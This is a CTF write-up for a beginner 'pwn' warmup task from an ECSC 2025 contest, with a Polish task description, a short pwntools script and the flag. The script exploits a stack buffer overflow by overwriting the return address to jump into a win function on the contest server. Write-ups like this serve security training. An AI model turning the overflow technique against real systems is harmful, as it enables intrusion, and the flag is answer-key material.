# Warmup: Pwn

> W tym roku przygotowaliśmy kilka zadań dla osób, które chcą zacząć swoją przygodę z konkursami z dziedziny cyberbezpieczeństwa (zazwyczaj nazywanymi CTFami). Dla tych z was, którzy pozjadali już zęby na CTFach, zadania te będą proste (lub wręcz trywialne), ale jeśli dla kogoś jest to pierwszy start - warto zacząć od nich przed przejściem do tych trudniejszych.
>
> Zadania wraz z ich opisami znajdziesz na poniższej stronie:
>
> [https://warmup.ecsc25.hack.cert.pl/#pwn](https://warmup.ecsc25.hack.cert.pl/#pwn)
>
> Na tej podstronie wpisz flagę z zadania w kategorii **pwn**.


## Solution
Blatant stack overflow & no ASLR or canaries. Just return to `win + 8` (to skip the prologue and have proper alignment in the call to `system`):

```py
from pwn import *

e = ELF('./server', checksec=False)

# io = e.process()
io = remote('warmup.ecsc25.hack.cert.pl', 5210)

io.sendline(b'A' * 16 + b'B' * 8 + p64(e.sym['win'] + 8))
io.interactive()
```

## Flag
`ecsc25{pwn3d}`
